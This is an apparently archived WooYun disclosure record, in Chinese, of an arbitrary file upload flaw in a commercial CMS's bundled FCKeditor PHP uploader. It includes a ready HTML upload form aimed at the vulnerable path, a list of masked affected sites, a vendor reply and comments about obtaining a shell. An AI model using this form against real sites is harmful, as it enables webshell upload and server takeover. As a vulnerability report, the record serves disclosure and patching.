{"id": 44947, "wybug_id": "wooyun-2015-090835", "wybug_title": "某超大型商业CMS任意文件上传导致代码执行（涉及500强、工业、国企、电商、酒店集团、服务业等等领域）", "wybug_corp": "北京易龙天网科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-01-09 17:55", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： 偶然间去研究后发现了 详细说明：  前人有经验： WooYun: 某超大型商业CMS高危通用SQL注射+Getshell（涉及500强、工业、国企、电商、酒店集团、服务业等等领域）  提交给了Cncert得到很好的修复效果。\n\n某超大型商业CMS通用任意文件上传导致代码执行# 涉及500强、工业、国企、电商、酒店集团、服务业等等领域  这套CMS提供商是土豪级的，专为世界500强企业、国家A类大型企业、核工业、电商、高大上酒店行业、服务业、商业等各个领域几千个客户服务国家电网、中国石化、中国石油、中粮、国机重工、国家核电等全部躺枪各类电商、七星级酒店、世界500强就不例举了七星迪曼·易龙天 七星迪曼•易龙天，是一家为大型企业和组织提供互联网全案整合营销服务的专业企业；主要提供网络整合营销咨询、技术解决方案与产品、品牌营销推广、平台运营等服务。公司成立于 2003 年，总部位于北京，现有员工超过 140 人。现公司下设 七星迪曼传媒 与 易龙天网科技 两家公司，以及一家独立事业平台 七星酒店网 。七星迪曼•易龙天，与超过 2500 家世界 500 强及高成长性企业深度合作，同时成为 7 家世界 500 强企业纳入优质供应商。\n\n更多案例请戳这里，官网展示更加直观\nhttp://www.elongtian.com/kehuanli/\n   漏洞证明：  CMS为易商宝，其前台存在任意文件上传因为这个编辑器存在超级严重的问题：\n参考链接：http:/\n\nmask 区域\n\n*****5yk*****\n\n\n\n/Article/zjbghdzj/62437.htmVersion <=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。<form id=\"frmUpload\" enctype=\"multipart/form-data\"action=\"\n\n\n\nmask 区域\n\n1.http://**.**.**\n\n\n\ncom/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media\" method=\"post\">Upload a new file:<br><input type=\"file\" name=\"NewFile\" size=\"50\"><br><input id=\"btnUpload\" type=\"submit\" value=\"Upload\"></form>\n案例（google随意抽取的20例）\n\nmask 区域\n1.http://**.**.**/\n\napply/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**\n\n/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**\n\n/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**\n\n/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**\n\n/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/framework_gb/\n\nWeb/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/fr\n\namework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/\n\nframework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**\n\n/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/framework\n\n_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\nmask 区域\n1.http://**.**.**/bln02/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php_2.http://**.**.**/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php_3.http://**.**.**/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php_4.http://**.**.**/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php_5.http://**.**.**/framework_gb/Web/UI/FCKeditor/editor/filemanager/upload/php/upload.php\n\n</mask>测试其中的一例：\n\n\n\n\n\n   修复方案：  升级编辑器版本吧，希望CNCERT给个处置报告，也希望该公司继续积极响应修复该高危漏洞！rank20+   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-01-14 14:29 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-09 18:06 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  标题好屌    \n     2015-01-09 18:11 |    \t\t发条橙子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:6        | ∑(っ °Д °;)っ)\t\t \n  CCAV看这里    \n     2015-01-09 18:25 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  http://wooyun.org/bugs/wooyun-2014-081438    \n     2015-01-09 18:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @黑暗游侠 嗯 一个系统 但漏洞更严重些    \n     2015-01-09 18:46 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @疯狗 其实那个也登陆后台了，是直接可以上传shell的。没有扩展名过滤。都可以拿shell，严重程度应该相当吧感觉。    \n     2015-01-09 19:19 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  includes/Upload/Upload.php难到是这儿？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}